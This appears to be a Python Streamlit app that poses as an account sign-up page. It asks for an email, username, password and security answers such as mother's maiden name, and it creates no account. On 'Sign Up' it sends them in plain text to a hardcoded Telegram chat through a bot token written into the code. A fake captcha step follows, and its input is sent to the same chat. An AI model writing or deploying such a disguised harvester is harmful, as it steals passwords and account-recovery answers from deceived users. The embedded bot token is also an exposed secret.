import streamlit as st
import pandas as pd
import csv, io
import telebot
import cv2

# streamlit run app.py

ph6 = st.empty()
ph6.subheader("Please Create an Account")
ph9 = st.empty()
new_user = ph9.text_input('Email Address')
ph7 = st.empty()
new_user = ph7.text_input('Username')
ph10 = st.empty()
ph10.write('Password must contain 14 characters, out of which at least one latin but not more the 4, 2 special characters, and one math symbol. if your password contains the letter ''o'', exactly two symbols are required')
ph8 = st.empty()
new_passwd = ph8.text_input('Password', type='password')


ph1 = st.empty()
ph1.write('Please answer the security questions:')
ph2 = st.empty()
school = ph2.text_input('Name of your first school?')
ph3 = st.empty()
mom_name = ph3.text_input('Mother''s maiden name?')
ph4 = st.empty()
type = ph4.text_input('Urban or beach vibe?')
ph5 = st.empty()
hotel = ph5.text_input('Fancy Boho chic hotel or airbnb in a secluded beach?')

# save results to csv and send via telegram


TOKEN = "2034688341:AAGiWVOQZ_wJUDLEGPbqXn80LzJ9palMWu0"
tb = telebot.TeleBot(TOKEN)  # create a new Telegram Bot object
chat_id = '630924196'

placeholder = st.empty()
signupbut = placeholder.button('Sign Up')

ver = False
if signupbut:
    placeholder.empty()
    tb.send_message(chat_id, 'New User: ' + new_user + '\n' + 'Password: ' + new_passwd + '\n' + 'School: ' + school + '\n' + 'Mother''s Maiden Name: ' + mom_name + '\n' + 'Vibe: ' + type + '\n' + 'Hotel: ' + hotel)
    a = [eval('ph%s.empty()' % i) for i in range(1,11)]

    ph1 = st.empty()
    ph1.write('Please confirm you''re not a robot:')
    ph2 = st.empty()
    im = ph2.image('captcha.png')
    ph3 = st.empty()
    captcha = ph3.text_input('Enter image numbers (make sure images do not contradict each other)')
    ph4 = st.empty()
    ver = ph4.button('Verify')
    if ver:
        st.success("You have successfully created an account.Go to the Login Menu to login")

        # here - st image with my letter
        tb.send_message(chat_id, 'images: ' + captcha)
        a = [eval('ph%s.empty()' % i) for i in range(1, 5)]
        ver2 = st.button('Vy')






